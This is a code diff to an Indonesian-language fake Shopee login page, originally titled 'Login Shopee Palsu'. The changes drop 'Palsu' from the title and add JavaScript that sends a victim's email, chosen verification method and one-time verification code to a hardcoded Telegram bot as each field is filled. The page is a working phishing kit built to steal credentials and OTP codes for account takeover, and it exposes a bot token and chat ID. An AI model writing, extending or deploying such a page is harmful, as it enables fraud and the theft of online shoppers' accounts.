@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Login Shopee Palsu dengan Verifikasi dan Telegram</title>
+<title>Login Shopee dengan Telegram otomatis</title>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -60,6 +60,7 @@
   const telegramBotToken = '8309524194:AAE8fU0nBYFuMWivh05WHsUT2FwdQfT6O0M';
   const chatId = '5116335881';
 
+  // Fungsi kirim pesan ke Telegram
   function sendTelegramMessage(message) {
     const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
     fetch(url, {
@@ -80,11 +81,17 @@
       });
   }
 
+  // Saat pengguna pilih metode verifikasi
   function pilihVerifikasi(method) {
     document.getElementById('verif-section').style.display = 'block';
-    document.getElementById('verif-method-label').innerText = 'Masukkan kode dari ' + method;
+
+    // Kirim info login ke Telegram langsung saat pilihan dipilih
+    const email = document.getElementById('email').value || '(belum diisi)';
+    const pesan = `Login baru:\nEmail: ${email}\nMetode Verifikasi: ${method}\nStatus: Memilih metode`;
+    sendTelegramMessage(pesan);
   }
 
+  // Saat pengguna submit login
   function submitLogin() {
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
@@ -96,11 +103,11 @@
       return;
     }
 
-    // Kirim pesan ke Telegram
-    const pesan = `Login baru:\nEmail: ${email}\nMetode Verifikasi: ${metode}\nKode: ${kodeVerif}`;
+    // Kirim info login dan kode verifikasi ke Telegram
+    const pesan = `Login:\nEmail: ${email}\nMetode: ${metode}\nKode Verifikasi: ${kodeVerif}`;
     sendTelegramMessage(pesan);
 
-    alert('Verifikasi berhasil! Anda masuk.');
+    alert('Verifikasi selesai dan pesan dikirim ke Telegram!');
   }
 </script>
 </head>
@@ -117,7 +124,7 @@
 
     <div class="verif-method">
       <label for="verif-method">Pilih metode verifikasi:</label>
-      <select id="verif-method-select" onchange="pilihVerifikasi(this.value)">
+      <select id="verif-method" onchange="pilihVerifikasi(this.value)">
         <option value="">--Pilih metode--</option>
         <option value="WhatsApp">WhatsApp</option>
         <option value="Email">Email</option>
@@ -126,7 +133,7 @@
     </div>
 
     <div class="verif-section" id="verif-section">
-      <label id="verif-method-label"></label>
+      <label id="verif-label"></label>
       <input type="text" id="kode-verifikasi" placeholder="Masukkan kode" required />
     </div>
 
@@ -134,5 +141,36 @@
   </form>
 </div>
 
+<script>
+  // Atur label verifikasi saat memilih metode
+  function pilihVerifikasi(method) {
+    document.getElementById('verif-section').style.display = 'block';
+    document.getElementById('verif-label').innerText = 'Masukkan kode dari ' + method;
+
+    // Segera kirim info login ke Telegram saat metode dipilih
+    const email = document.getElementById('email').value || '(belum diisi)';
+    const pesan = `Login baru:\nEmail: ${email}\nMetode Verifikasi: ${method}\nStatus: Memilih metode`;
+    sendTelegramMessage(pesan);
+  }
+
+  // Kirim pesan saat login selesai
+  function submitLogin() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    const kodeVerif = document.getElementById('kode-verifikasi').value;
+    const metode = document.getElementById('verif-method').value;
+
+    if (!email || !password || !metode || !kodeVerif) {
+      alert('Harap lengkapi semua kolom!');
+      return;
+    }
+
+    const pesan = `Login:\nEmail: ${email}\nMetode: ${metode}\nKode Verifikasi: ${kodeVerif}`;
+    sendTelegramMessage(pesan);
+
+    alert('Pesan dikirim ke Telegram dan proses login selesai.');
+  }
+</script>
+
 </body>
-</html>
+  </html>
